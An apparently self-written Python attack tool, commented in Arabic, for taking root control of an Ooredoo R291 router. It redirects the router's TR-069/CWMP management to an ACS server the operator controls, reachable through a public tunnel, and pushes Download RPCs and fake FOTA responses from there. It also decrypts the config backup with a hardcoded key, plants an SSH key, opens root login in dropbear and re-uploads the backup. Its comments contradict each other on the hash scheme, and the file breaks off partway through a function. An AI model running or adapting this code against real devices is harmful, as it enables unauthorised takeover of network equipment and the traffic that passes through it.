#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
acs_tr069.py — وحدة مسار TR-069 / FOTA — راوتر Ooredoo R291 (Notion)
====================================================================
الهدف: جعل الراوتر يتصل بخادم ACS نتحكم فيه (محلياً أو عبر نفق عام)،
       ثم استغلال بروتوكول CWMP (TR-069) لإرسال أوامر Download
       و SetParameterValues لتحقيق shell root (أو كشف باسورد SSH).

البنية (أربعة أجزاء + سطر أوامر):
    Part 1 — واجهة الراوتر (RGW XML API):  قراءة/كتابة إعدادات tr069، فحص daemons
    Part 2 — خادم ACS (SOAP/CWMP):         استقبال Inform وإرسال RPCs (Download...)
    Part 3 — خادم FOTA (JSON):             محاكاة خادم نوتون (مسار احتياطي)
    Part 4 — خادم ملفات بسيط:              لتسليم ملف الـ Download
    Part 5 — سطر الأوامر:             check | arm | serve | download | fota | ota-probe | root-check | root-shell | arm-root-pw

الخطوات المقترحة (بالتسلسل):
    1) python3 acs_tr069.py check                    # تشخيص الراوتر الحي
    2) python3 acs_tr069.py arm                      # توجيه CWMP إلى خادمنا
    3) python3 acs_tr069.py serve --wait 120         # انتظار أول Inform
    4) python3 acs_tr069.py serve --probe            # جرد بيانات CWMP المتاحة
    5) python3 acs_tr069.py serve --download FILE --filetype 3
       # filetype 3 = "1 Vendor Configuration File" (يكتب /etc/config)
       # filetype 1 = "1 Firmware Upgrade Image"    (صورة نظام)
    ...

ملاحظات مهمة:
    - المصادقة على الراوتر تمر عبر api_login (نفس الجلسة والهيدرات).
    - تشفير نسخة الإعدادات: aes-128-cbc + md5 + كلمة السر GYtAlIZh
      (تحذير: track1_modify_config يستخدم sha256 — هذا خطأ، الراوتر يستخدم md5).
    - إن لم يصل الـ Inform (الراوتر يصل للإنترنت عبر LTE كـ default route):
      شغّل نفقاً عاماً إلى منفذنا، مثال:
          cloudflared tunnel --url http://localhost:7547
      ثم:  python3 acs_tr069.py arm --url https://xxx.trycloudflare.com/openacs-client/acs
"""

import argparse
import json
import os
import re
import socket
import subprocess
import sys
import tarfile
import threading
import time
import xml.etree.ElementTree as ET
from http.server import BaseHTTPRequestHandler, HTTPServer, ThreadingHTTPServer, SimpleHTTPRequestHandler
from typing import Dict, List, Optional, Tuple

import api_login  # جلسة الراوتر (ROUTER_IP, login, api_call)

# =====================================================================
# إعدادات قابلة للتعديل (ضع قيمك هنا)
# =====================================================================
ACS_PORT    = 7547           # منفذ خادم ACS (القياسي CWMP)
ACS_PATH    = "/openacs-client/acs"   # نفس مسار خادم نوتون الحقيقي
FILES_PORT  = 8000           # منفذ تسليم ملفات الـ Download
FOTA_PORT   = 9091           # منفذ خادم FOTA (نفس منفذ نوتون)
INFORM_INTERVAL = 60         # مدة الإبلاغ الدوري (ثوانٍ)
CFG_PASSWORD = "GYtAlIZh"    # كلمة سر تشفير نسخة الإعدادات (من ثنائي xml_action.cgi)
LOG_DIR     = "logs"         # مجلد السجلات

# أسماء RPCs المدعومة (من ثنائي /usr/bin/tr069)
CWMP_RPCS = ["Download", "Upload", "Reboot", "FactoryReset", "SetParameterValues",
             "GetParameterValues", "GetParameterNames", "AddObject", "DeleteObject",
             "ScheduleInform", "ChangeDUState", "GetRPCMethods"]

# رموز أحداث الـ Inform (0-10)
EVENT_NAMES = {"0": "BOOTSTRAP", "1": "BOOT", "2": "PERIODIC", "3": "SCHEDULED",
               "4": "VALUE CHANGE", "5": "KICKED", "6": "CONNECTION REQUEST",
               "7": "TRANSFER COMPLETE", "8": "DIAGNOSTICS COMPLETE",
               "9": "REQUEST DOWNLOAD", "10": "AUTONOMOUS TRANSFER COMPLETE"}

# =====================================================================
# أدوات مساعدة عامة
# =====================================================================

def log(msg: str):
    os.makedirs(LOG_DIR, exist_ok=True)
    line = f"[{time.strftime('%H:%M:%S')}] {msg}"
    print(line)
    with open(os.path.join(LOG_DIR, "session.log"), "a") as f:
        f.write(line + "\n")


def save_raw(name: str, content: str):
    """حفظ XML/JSON خام للرجوع إليه لاحقاً."""
    os.makedirs(LOG_DIR, exist_ok=True)
    path = os.path.join(LOG_DIR, name)
    with open(path, "w") as f:
        f.write(content)
    return path


def local_ip() -> str:
    """اكتشاف IP هذا الجهاز على الشبكة التي تصل فعلاً إلى الراوتر
    (وليس الـ default route — قد تكون هناك واجهتان مختلفتان)."""
    for target, port in ((api_login.ROUTER_IP, 80), ("8.8.8.8", 80)):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target, port))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            continue
    return "127.0.0.1"


def xml_escape(s: str) -> str:
    return (s.replace("&", "&amp;").replace("<", "&lt;")
             .replace(">", "&gt;").replace('"', "&quot;"))


def local_tag(tag: str) -> str:
    """إزالة مساحة الاسم من اسم العنصر (تعمل مع أي عائلة SOAP)."""
    return tag.split("}")[-1] if tag.startswith("{") else tag


# =====================================================================
# Part 1 — واجهة الراوتر (RGW XML API)
# =====================================================================

def ensure_login() -> bool:
    import api_login
    if not api_login.CGISID:
        if not api_login.login():
            log("[-] فشل تسجيل الدخول إلى الراوتر")
            return False
        log(f"[+] تم الدخول (CGISID={api_login.CGISID})")
    return True


def _call(obj_path: str, obj_method: str, params: dict = None) -> str:
    """استدعاء API واحد ويعيد الرد الخام."""
    import api_login
    if not ensure_login():
        return ""
    raw = api_login.api_call(obj_path, obj_method, params)
    if not raw:
        return ""
    save_raw(f"rq_{obj_path}_{obj_method}.xml", raw)
    return raw


def rqw_parse(text: str) -> Dict[str, str]:
    """تحليل رد RGW (XML) إلى قاموس {وسم: قيمة} مع التقاط الأخطاء."""
    out: Dict[str, str] = {}
    errors = []
    try:
        root = ET.fromstring(text)
        for el in root.iter():
            t = local_tag(el.tag)
            if t in ("param", "RGW"):
                continue
            if len(el) == 0 and el.text is not None:
                out[t] = el.text.strip()
            if re.search(r"error|cause", t, re.I) and el.text is not None:
                errors.append(f"{t}={el.text.strip()}")
    except ET.ParseError:
        out["_raw"] = text[:200]
    if errors:
        out["_errors"] = "; ".join(errors)
    return out


def tr069_get_info() -> Dict[str, str]:
    """قراءة إعدادات CWMP من الراوتر (تعمل حتى وهي في قائمة prohibits)."""
    d = rqw_parse(_call("tr069", "tr069_get_info"))
    return d


def tr069_set_info(**kw) -> Dict[str, str]:
    """كتابة إعدادات CWMP (cwmp_enable, inform_enable, inform_interval,
    acs_url, acs_username, acs_password, conn_name, conn_psw, conn_port)."""
    params = {k: str(v) for k, v in kw.items() if v is not None}
    return rqw_parse(_call("tr069", "tr069_set_info", params))


def ota_query() -> str:
    return _call("ota", "query")


def ota_probe() -> List[Tuple[str, str]]:
    """محاولة أوامر قراءة آمنة على كائن ota (لا تطلق ترقية)."""
    results = []
    for m in ["query", "get_info", "get_config", "status"]:
        r = _call("ota", m)
        r_short = r.replace("\n", " ")[:120]
        results.append((m, r_short))
        log(f"[*] ota/{m} -> {r_short}")
        time.sleep(0.3)
    return results


def daemon_check() -> Dict[str, str]:
    """فحص شامل لحالة الراوتر: tr069 و ota و dropbear و eng mode."""
    log("===== فحص الراوتر الحي =====")
    res = {}
    for name, op, om in [("tr069", "tr069", "tr069_get_info"),
                         ("ota", "ota", "query"),
                         ("dropbear", "router", "get_dropbear_info"),
                         ("eng_mode", "cm", "get_eng_mode"),
                         ("version", "version", "get_version")]:
        try:
            raw = _call(op, om)
            res[name] = raw.replace("\n", " ")[:300]
            log(f"[*] {op}/{om} -> {res[name]}")
        except Exception as e:
            res[name] = f"ERROR: {e}"
            log(f"[-] {op}/{om} فشل: {e}")
    return res


# ---------------------------------------------------------------------
# Part 1b — توجيه CWMP إلينا
# ---------------------------------------------------------------------

def arm_acs(acs_url: Optional[str] = None, interval: int = INFORM_INTERVAL,
            username: str = "notion", password: str = "notion") -> Dict[str, str]:
    """
    الطريقة (أ): تفعيل tr069 وإبلاغ ACS عبر tr069_set_info مباشرة.
    تعيد حالة الرد؛ إن وجد خطأ استخدم config_restore_arm بديلاً.
    """
    if not acs_url:
        acs_url = f"http://{local_ip()}:{ACS_PORT}{ACS_PATH}"
    log(f"[*] محاولة tr069_set_info: acs_url={acs_url} interval={interval}")
    d = tr069_set_info(cwmp_enable="1", inform_enable="1",
                       inform_interval=str(interval),
                       acs_url=acs_url,
                       acs_username=username, acs_password=password)
    if d.get("_errors"):
        log(f"[-] الخطأ: {d['_errors']}")
    else:
        log(f"[+] tr069_set_info مقبول: {d}")
    # تحقق من القراءة لمعرفة ما تغير فعلاً
    got = tr069_get_info()
    log(f"[*] بعد الكتابة: {got}")
    return got


def uci_set(path: str, key: str, value: str):
    """تعديل مفتاح في ملف UCI (option key 'value') — يضيفه إن لم يوجد."""
    with open(path) as f:
        lines = f.read().splitlines()
    pat = re.compile(r"^\s*option\s+" + re.escape(key) + r"\s+")
    replaced = False
    out = []
    for ln in lines:
        if not replaced and pat.match(ln):
            out.append(f"\toption {key} '{value}'")
            replaced = True
        else:
            out.append(ln)
    if not replaced:
        out.append(f"\toption {key} '{value}'")
    with open(path, "w") as f:
        f.write("\n".join(out) + "\n")


def _download_backup(path: str) -> bool:
    """سحب نسخة الإعدادات المشفرة من الراوتر."""
    import api_login
    if not ensure_login():
        return False
    from api_login import make_auth, ROUTER_URL, CGISID
    headers = {"Authorization": make_auth("POST"),
               "Cookie": f"CGISID={CGISID}",
               "Referer": f"{ROUTER_URL}/"}
    r = api_login.sess.post(f"{ROUTER_URL}/xml_action.cgi?Action=Download&file=backup_config",
                            headers=headers, timeout=30)
    if r.status_code != 200 or len(r.content) < 100:
        log(f"[-] فشل سحب النسخة: HTTP {r.status_code}")
        return False
    with open(path, "wb") as f:
        f.write(r.content)
    log(f"[+] نسخة الإعدادات في {path} ({len(r.content)} بايت)")
    return True


def _openssl_decrypt(src: str, dst: str) -> bool:
    # ⚠ تمّ تأكيده تجريبياً على ملف backup_config محمّل حديثاً: GYtAlIZh + sha256 (ليس md5)
    r = subprocess.run(["openssl", "enc", "-d", "-aes-128-cbc", "-md", "sha256",
                        "-in", src, "-out", dst, "-pass", f"pass:{CFG_PASSWORD}"],
                       capture_output=True)
    if r.returncode != 0 or not os.path.exists(dst) or os.path.getsize(dst) == 0:
        log(f"[-] فك التشفير فشل: {r.stderr.decode(errors='replace')[:200]}")
        return False
    return True


def _openssl_encrypt(src: str, dst: str) -> bool:
    r = subprocess.run(["openssl", "enc", "-aes-128-cbc", "-md", "sha256", "-salt",
                        "-in", src, "-out", dst, "-pass", f"pass:{CFG_PASSWORD}"],
                       capture_output=True)
    if r.returncode != 0:
        log(f"[-] التشفير فشل: {r.stderr.decode(errors='replace')[:200]}")
        return False
    return True


def config_restore_arm(acs_url: str, interval: int = INFORM_INTERVAL,
                       username: str = "notion", password: str = "notion") -> Dict:
    """
    الطريقة (ب): تعديل نسخة الإعدادات محلياً ورفعها عبر restore_config.
    - تستخدم aes-128-cbc + md5 (مطابق لسلوك الراوتر، وليس sha256!)
    - تتطلب إعادة تشغيل الراوتر لتطبيق التغييرات.
    """
    import api_login
    work = f"/tmp/tr069_arm_{int(time.time())}"
    os.makedirs(work, exist_ok=True)
    enc = os.path.join(work, "cfg.bin")
    dec = os.path.join(work, "cfg.tar.gz")
    mod = os.path.join(work, "cfg_mod.tar.gz")
    enc_out = os.path.join(work, "cfg_mod_enc.bin")

    if not _download_backup(enc):
        return {"success": False, "error": "download failed"}
    if not _openssl_decrypt(enc, dec):
        return {"success": False, "error": "decrypt failed"}
    with tarfile.open(dec, "r:gz") as tar:
        tar.extractall(work)

    tr_path = os.path.join(work, "etc/config/tr069")
    if not os.path.exists(tr_path):
        return {"success": False, "error": "no etc/config/tr069 in backup"}
    uci_set(tr_path, "tr069_enable", "1")
    uci_set(tr_path, "inform_enable", "1")
    uci_set(tr_path, "inform_interval", str(interval))
    uci_set(tr_path, "acs_url", acs_url)
    uci_set(tr_path, "acs_username", username)
    uci_set(tr_path, "acs_password", password)
    log(f"[+] tr069 المعدل:\n{open(tr_path).read()}")

    with tarfile.open(mod, "w:gz") as tar:
        tar.add(os.path.join(work, "etc"), arcname="etc")
    if not _openssl_encrypt(mod, enc_out):
        return {"success": False, "error": "encrypt failed"}

    # الرفع بنفس صيغة المتصفح (multipart + حقل config_backup.bin)
    url = f"{api_login.ROUTER_URL}/xml_action.cgi?Action=Upload&file=restore_config&command="
    headers = {"Cookie": f"CGISID={api_login.CGISID}",
               "Referer": f"{api_login.ROUTER_URL}/",
               "Origin": api_login.ROUTER_URL}
    files = {"config_backup.bin": ("config_backup.bin.decrypted.tar.gz",
                                   open(enc_out, "rb").read(), "application/gzip")}
    try:
        r = api_login.sess.post(url, files=files, headers=headers, timeout=60)
        ok = r.status_code == 200
        log(f"[{'+' if ok else '-'}] الرفع: HTTP {r.status_code} -> {r.text[:200]}")
        return {"success": ok, "status": r.status_code, "body": r.text[:300]}
    except Exception as e:
        return {"success": False, "error": str(e)}


def ensure_ssh_keypair() -> Tuple[str, str]:
    """إرجاع (private, public) — يعيد مفتاحًا موجودًا أو ينشئ RSA جديد."""
    priv = os.path.expanduser("~/.ssh/id_rsa_modified")
    pub = priv + ".pub"
    if not (os.path.exists(priv) and os.path.exists(pub)):
        subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "2048", "-f", priv,
                        "-N", "", "-q"], check=True)
    with open(pub) as f:
        return priv, f.read().strip()


def arm_root_ssh(pubkey: Optional[str] = None, known_password: Optional[str] = None,
                 reboot_after: bool = True) -> Dict:
    """
    الحصول على shell root عبر config-restore:
      1. تحميل النسخة الاحتياطية (sha256/GYtAlIZh).
      2. إضافة المفتاح العلني إلى etc/config/authorized_keys (المسار الذي يقرأه الـ firmware).
      3. تعقيد etc/config/dropbear: PasswordAuth + RootPasswordAuth + PubkeyAuth + Port 22.
      4. رفع الملف المعدّل عبر restore_config.
      5. (اختياري) إعادة تشغيل — يُعيد change_ssh_key.sh تشغيل dropbear مع الإعدادات الجديدة.

    ⚠ restore_config يكتب فقط داخل /etc/config (نطاق النسخ الاحتياطي).
    ⚠ بعد الإعادة جرّب:  ssh -i <مفتاحك> root@192.168.1.1
    """
    if not api_login.CGISID:
        api_login.login()
    priv, default_pub = ensure_ssh_keypair()
    pubkey = pubkey or default_pub
    log(f"[*] المفتاح العلني: {pubkey[:60]}...")

    work = f"/tmp/rootssh_{int(time.time())}"
    os.makedirs(work, exist_ok=True)
    enc, dec = os.path.join(work, "cfg.bin"), os.path.join(work, "cfg.tar.gz")
    if not (_download_backup(enc) and _openssl_decrypt(enc, dec)):
        return {"success": False, "error": "decrypt failed"}
    with tarfile.open(dec, "r:gz") as tar:
        tar.extractall(work)

    # authorized_keys داخل مجلد config (المكان الذي يظهر فيه في الـ backup)
    ak = os.path.join(work, "etc/config/authorized_keys")
    existing = open(ak).read() if os.path.exists(ak) else ""
    if pubkey not in existing:
        with open(ak, "a") as f:
            f.write(pubkey + "\n")
        log("[+] أضفنا المفتاح إلى etc/config/authorized_keys")
    # كذلك ننسخه إلى المسار الذي يقرأه dropbear (AuthorizedKeysFile) للوقائية
    dbdir = os.path.join(work, "etc/dropbear")
    os.makedirs(dbdir, exist_ok=True)
    with open(os.path.join(dbdir, "authorized_keys"), "w") as f:
        f.write(pubkey + "\n")
    log("[+] نسخ المفتاح إلى etc/dropbear/authorized_keys (احتياطي)")

    # تعقيد dropbear config
    dpath = os.path.join(work, "etc/config/dropbear")
    with open(dpath, "w") as f:
        f.write("config dropbear\n")
        f.write("\toption PasswordAuth 'on'\n")
        f.write("\toption RootPasswordAuth 'on'\n")
        f.write("\toption PubkeyAuth 'on'\n")
        f.write("\toption AuthorizedKeysFile '/etc/dropbear/authorized_keys'\n")
        f.write("\toption Port '22'\n")
    log("[+] dropbear config محدّث (PubkeyAuth on، كل الأنواع مفتوحة)")

    # إعادة تعبئة + تشفير + رفع
    repacked = os.path.join(work, "repack.tar.gz")
    with tarfile.open(repacked, "w:gz") as tar:
        tar.add(os.path.join(work, "etc"), arcname="etc")
    enc_out = os.path.join(work, "repack_enc.bin")
    if not _openssl_encrypt(repacked, enc_out):
        return {"success": False, "error": "encrypt failed"}

    # رفع مباشر دون config_restore_arm (نعيد تخطيط الأسلوب)
    upload = _upload_restore(enc_out)
    log(f"[*] الرفع: {upload}")
    if not upload.get("success"):
        return {"success": False, "error": upload}
    info = {"success": True, "priv": priv}
    if known_password:
        info["fallback_password"] = known_password
    if reboot_after:
        log("[*] إعادة تشغيل الراوتر لتطبيق الإعدادات...")
        api_login.api_call("router", "router_call_reboot")
    log("[+] بعد الإعادة جرّب:  ssh -i " + priv + " root@" + api_login.ROUTER_IP)
    return info


def _upload_restore(enc_path: str) -> Dict:
    """رفع ملف إعدادات مشفر restore_config (Multipart + حقل config_backup.bin)."""
    if not api_login.CGISID:
        api_login.login()
    url = f"{api_login.ROUTER_URL}/xml_action.cgi?Action=Upload&file=restore_config&command="
    headers = {"Cookie": f"CGISID={api_login.CGISID}",
               "Referer": f"{api_login.ROUTER_URL}/",
               "Origin": api_login.ROUTER_URL}
    with open(enc_path, "rb") as f:
        files = {"config_backup.bin": ("config_backup.bin.decrypted.tar.gz", f.read(),
                                       "application/gzip")}
    r = api_login.sess.post(url, files=files, headers=headers, timeout=60)
    ok = r.status_code == 200
    log(f"[{'+' if ok else '-'}] الرفع restore_config: HTTP {r.status_code} -> {r.text[:200]}")
    return {"success": ok, "status": r.status_code, "body": r.text[:200]}


# =====================================================================
# Part 2 — خادم ACS (SOAP/CWMP)
# =====================================================================

# حالة الجلسة المشتركة + قائمة انتظار RPCs
STATE = {"device": None, "sessions": 0, "params": {}, "last_contact": None,
         "rpcs_received": [], "rpcs_sent": []}
QUEUE: List[str] = []
QLOCK = threading.Lock()
NAMESPACES = {"SOAP-ENV": "http://schemas.xmlsoap.org/soap/envelope/",
              "SOAP-ENC": "http://schemas.xmlsoap.org/soap/encoding/",
              "xsd": "http://www.w3.org/2001/XMLSchema",
              "xsi": "http://www.w3.org/2001/XMLSchema-instance"}
CWMP_NS = "urn:dslforum-org:cwmp-1-0"


def enqueue_rpc(body_xml: str):
    with QLOCK:
        QUEUE.append(body_xml)


def drain_queue() -> List[str]:
    with QLOCK:
        items, QUEUE[:] = QUEUE[:], []
    return items


def build_envelope(body_xml: str, cwmp_id: str = "1") -> str:
    """غلاف SOAP قياسي TR-069 مع ID نتصاعدي."""
    ns = " ".join(f'xmlns:{p}="{v}"' for p, v in NAMESPACES.items())
    return (f'<?xml version="1.0" encoding="utf-8"?>\n'
            f'<SOAP-ENV:Envelope {ns} xmlns:cwmp="{CWMP_NS}">\n'
            f'<SOAP-ENV:Header><cwmp:ID SOAP-ENV:mustUnderstand="1">{cwmp_id}</cwmp:ID></SOAP-ENV:Header>\n'
            f'<SOAP-ENV:Body>\n{body_xml}\n</SOAP-ENV:Body>\n</SOAP-ENV:Envelope>')


# ---------------------- بناة RPC ----------------------

def soap_download(command_key: str, filetype: str, url: str, filesize: int,
                  target: str, delay: int = 0, success_url: str = "",
                  failure_url: str = "") -> str:
    return (f'<cwmp:Download>\n'
            f'<CommandKey>{xml_escape(command_key)}</CommandKey>\n'
            f'<FileType>{filetype}</FileType>\n'
            f'<URL>{xml_escape(url)}</URL>\n'
            f'<Username></Username>\n<Password></Password>\n'
            f'<FileSize>{filesize}</FileSize>\n'
            f'<TargetFileName>{xml_escape(target)}</TargetFileName>\n'
            f'<DelaySeconds>{delay}</DelaySeconds>\n'
            f'<SuccessURL>{xml_escape(success_url)}</SuccessURL>\n'
            f'<FailureURL>{xml_escape(failure_url)}</FailureURL>\n'
            f'</cwmp:Download>')


def soap_set_parameter_values(params: List[Tuple[str, str, str]]) -> str:
    """params: قائمة (اسم، نوع xsd، قيمة)."""
    n = len(params)
    items = "".join(
        f'<ParameterValueStruct><Name>{xml_escape(name)}</Name>'
        f'<Value xsi:type="xsd:{typ}">{xml_escape(val)}</Value></ParameterValueStruct>\n'
        for name, typ, val in params)
    return (f'<cwmp:SetParameterValues>\n'
            f'<ParameterList SOAP-ENC:arrayType="cwmp:ParameterValueStruct[{n}]">\n'
            f'{items}</ParameterList>\n</cwmp:SetParameterValues>')


def soap_get_rpc_methods() -> str:
    return "<cwmp:GetRPCMethods/>"


def soap_get_parameter_values(names: List[str]) -> str:
    n = len(names)
    items = "".join(f"<string>{xml_escape(x)}</string>" for x in names)
    return (f'<cwmp:GetParameterValues>\n'
            f'<ParameterNames SOAP-ENC:arrayType="xsd:string[{n}]">{items}</ParameterNames>\n'
            f'</cwmp:GetParameterValues>')


def soap_get_parameter_names(path: str = "Device.") -> str:
    return (f"<cwmp:GetParameterNames><ParameterPath>{xml_escape(path)}</ParameterPath>"
            f"<NextLevel>true</NextLevel></cwmp:GetParameterNames>")


def soap_schedule_inform(interval: int, command_key: str = "") -> str:
    return (f"<cwmp:ScheduleInform><DelaySeconds>{interval}</DelaySeconds>"
            f"<CommandKey>{xml_escape(command_key)}</CommandKey></cwmp:ScheduleInform>")


def soap_reboot(command_key: str = "") -> str:
    return f"<cwmp:Reboot><CommandKey>{xml_escape(command_key)}</CommandKey></cwmp:Reboot>"


# ---------------------- معالجة الطلبات (وظائف مستقلة قابلة للاختبار) ----------------------

def envelope_id(root) -> str:
    for el in root.iter():
        if local_tag(el.tag) == "ID":
            return (el.text or "0").strip()
    return "1"


def parse_body_children(root) -> List[Tuple[str, ET.Element]]:
    """إرجاع (اسم محلي، عنصر) لأبناء SOAP-ENV:Body."""
    out = []
    for el in root.iter():
        if local_tag(el.tag) == "Body":
            for child in el:
                out.append((local_tag(child.tag), child))
    return out


def handle_inform(body_el: ET.Element, cwmp_id: str,
                  peer: str = "?", raw_body: str = "") -> str:
    """معالجة cwmp:Inform — تسجيل الجهاز والمعلمات وإرجاع الرد مع طابور RPCs."""
    device = {}
    for el in body_el.iter():
        t = local_tag(el.tag)
        if t in ("Manufacturer", "OUI", "ProductClass", "SerialNumber", "CurrentTime", "RetryCount"):
            device[t] = (el.text or "").strip()
    events = []
    for el in body_el.iter():
        if local_tag(el.tag) == "EventStruct":
            code, key = "", ""
            for c in el:
                if local_tag(c.tag) == "EventCode":
                    code = (c.text or "").strip()
                if local_tag(c.tag) == "CommandKey":
                    key = (c.text or "").strip()
            events.append((code, EVENT_NAMES.get(code.split()[0], "؟"), key))
    params = {}
    for el in body_el.iter():
        if local_tag(el.tag) == "ParameterValueStruct":
            name, val = "", ""
            for c in el:
                if local_tag(c.tag) == "Name":
                    name = (c.text or "").strip()
                if local_tag(c.tag) == "Value":
                    val = (c.text or "").strip()
            if name:
                params[name] = val

    STATE["device"] = device
    STATE["params"] = params
    STATE["sessions"] += 1
    STATE["last_contact"] = time.strftime("%Y-%m-%d %H:%M:%S")
    STATE["rpcs_received"].append("Inform")

    log("==============================================")
    log(f"[+] INFORM (رقم {STATE['sessions']}) من {peer}")
    for k, v in device.items():
        log(f"    {k}: {v}")
    for code, name, key in events:
        log(f"    حدث: {code} {name} (CommandKey='{key}')")
    log(f"    معلمات مرسلة: {len(params)}")
    save_raw(f"inform_{int(time.time())}.xml", raw_body)

    # حفظ أسماء المعلمات للاستفادة منها في probe
    if params:
        with open(os.path.join(LOG_DIR, "inform_params.txt"), "w") as f:
            for k in sorted(params):
                f.write(f"{k} = {params[k]}\n")
        log(f"[*] قائمة المعلمات محفوظة في {LOG_DIR}/inform_params.txt")

    # الرد: InformResponse + أي RPCs في طابور (أسلوب ACS قياسي)
    rpcs = drain_queue()
    for r in rpcs:
        STATE["rpcs_sent"].append(r.splitlines()[0][:60])
    body = (f'<cwmp:InformResponse>\n<MaxEnvelopes>1</MaxEnvelopes>\n</cwmp:InformResponse>\n'
            + "\n".join(rpcs))
    log(f"[*] سأرسل {len(rpcs)} RPC(s) مع الرد: {[r.splitlines()[0][:60] for r in rpcs]}")
    return build_envelope(body, cwmp_id)


class CwmpHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        pass  # نمنع ضجيج http.server ونكتب يدوياً

    def _send(self, body: bytes, ctype: str = 'text/xml; charset="utf-8"', code: int = 200):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_body(self) -> str:
        try:
            n = int(self.headers.get("Content-Length", 0))
        except ValueError:
            n = 0
        if n <= 0:
            return ""
        return self.rfile.read(n).decode("utf-8", errors="replace")

    def _handle_response(self, tag: str, body_el: ET.Element):
        """ردود CPE على RPCs: DownloadResponse / SetParameterValuesResponse / Fault."""
        STATE["rpcs_received"].append(tag)
        log(f"[*] ورد الرد: {tag}")
        details = {}
        for el in body_el.iter():
            t = local_tag(el.tag)
            if len(el) == 0 and el.text and el.text.strip() and t != "Body":
                details[t] = el.text.strip()
        if details:
            log(f"    تفاصيل: {details}")
        if tag == "DownloadResponse":
            status = details.get("Status", "؟")
            if status == "1":
                log("[+] Download اكتمل (Status=1) — نجح التحميل")
            else:
                log(f"[!] Download رُفض (Status={status}) — اقرأ FaultString أعلاه لتشخيص السبب")
        if tag == "Fault":
            log("[!] خطأ CWMP: FaultCode/FaultString أعلاه")
        save_raw(f"rsp_{tag}_{int(time.time())}.xml", self._raw_body)

    def do_POST(self):
        body = self._read_body()
        if not body.strip():
            # POST فارغ = إغلاق الجلسة من CPE → نرد بغلاف فارغ
            self._send(build_envelope("", "1").encode())
            return
        self._raw_body = body
        save_raw(f"req_{int(time.time())}.xml", body)
        try:
            root = ET.fromstring(body)
        except ET.ParseError as e:
            log(f"[-] XML غير صالح: {e}")
            self._send(build_envelope("", "1").encode())
            return
        cwmp_id = envelope_id(root)
        children = parse_body_children(root)
        if not children:
            self._send(build_envelope("", cwmp_id).encode())
            return
        tag, el = children[0]
        log(f"[*] طلب وارد: {tag} (من {self.client_address[0]})")
        if tag == "Inform":
            resp = handle_inform(el, cwmp_id,
                                 peer=self.client_address[0], raw_body=self._raw_body)
        elif tag.endswith("Response") or tag == "Fault":
            self._handle_response(tag, el)
            resp = build_envelope("", cwmp_id)  # إغلاق الجلسة
        else:
            log(f"[*] RPC غير مألوف: {tag}")
            resp = build_envelope("", cwmp_id)
        self._send(resp.encode())

    def do_GET(self):
        # صفحة حالة بسيطة للمراجعة من المتصفح
        html = f"""<html><head><title>ACS status</title><meta charset="utf-8"></head>
<body><h1>خادم ACS يعمل</h1>
<pre>device={json.dumps(STATE['device'], ensure_ascii=False, indent=2)}
sessions={STATE['sessions']}
last_contact={STATE['last_contact']}
params_count={len(STATE['params'])}
rpcs_sent={json.dumps(STATE['rpcs_sent'], ensure_ascii=False, indent=2)}
rpcs_received={STATE['rpcs_received']}
queue={QUEUE}</pre></body></html>"""
        self._send(html.encode(), "text/html; charset=utf-8")


def start_acs(port: int = ACS_PORT) -> HTTPServer:
    srv = ThreadingHTTPServer(("0.0.0.0", port), CwmpHandler)
    srv.daemon_threads = True
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    log(f"[+] خادم ACS يستمع على المنفذ {port} (للوصول من الخارج: 0.0.0.0:{port}{ACS_PATH})")
    return srv


# =====================================================================
# Part 3 — خادم FOTA (JSON) — المسار الاحتياطي
# =====================================================================

FOTA_DEFAULT = {
    "upgrade_type": 2,
    "sw_version": "R291_V2_v9.9.9",
    "file1_size": 0,
    "file2_size": 0,
    "md5": "",
    "type": 2,
    "url": f"http://{local_ip()}:{FILES_PORT}/",
    "server_url": f"http://{local_ip()}:{FOTA_PORT}/",
}

fota_response: Dict = dict(FOTA_DEFAULT)


def load_fota_response(path: Optional[str]):
    global fota_response
    if path and os.path.exists(path):
        with open(path) as f:
            fota_response = json.load(f)
    log(f"[*] رد FOTA المضبوط: {json.dumps(fota_response, ensure_ascii=False)}")


class FotaHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        pass

    def _handle(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n).decode("utf-8", errors="replace") if n else ""
        log(f"[*] FOTA {self.command} {self.path} من {self.client_address[0]}")
        if body:
            log(f"    جسم الطلب: {body[:500]}")
        save_raw(f"fota_{int(time.time())}.txt",
                 f"{self.command} {self.path}\n{self.headers}\n{body}\n")
        # نتحكم بالرد كاملاً من fota_response.json — جرّب وغيّر الحقول حتى يقبلها ota
        payload = json.dumps(fota_response).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    do_GET = do_POST = _handle


def start_fota(port: int = FOTA_PORT) -> HTTPServer:
    srv = ThreadingHTTPServer(("0.0.0.0", port), FotaHandler)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    log(f"[+] خادم FOTA يستمع على المنفذ {port}")
    return srv


# =====================================================================
# Part 4 — خادم الملفات (لأمر Download)
# =====================================================================

def start_fileserver(directory: str, port: int = FILES_PORT) -> HTTPServer:
    handler = lambda *a, **kw: SimpleHTTPRequestHandler(*a, directory=directory, **kw)
    srv = ThreadingHTTPServer(("0.0.0.0", port), handler)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    log(f"[+] خادم الملفات: http://{local_ip()}:{port}/ (المجلد {directory})")
    return srv


# =====================================================================
# Part 5 — سطر الأوامر (workflow واضح)
# =====================================================================

def cmd_check(args):
    daemon_check()


def cmd_arm(args):
    ensure_login()
    acs_url = args.url or f"http://{local_ip()}:{args.acs_port}{ACS_PATH}"
    log(f"[*] سنوجّه CWMP إلى: {acs_url}")
    got = arm_acs(acs_url, interval=args.interval)
    if got.get("_errors") or not got.get("acs_url"):
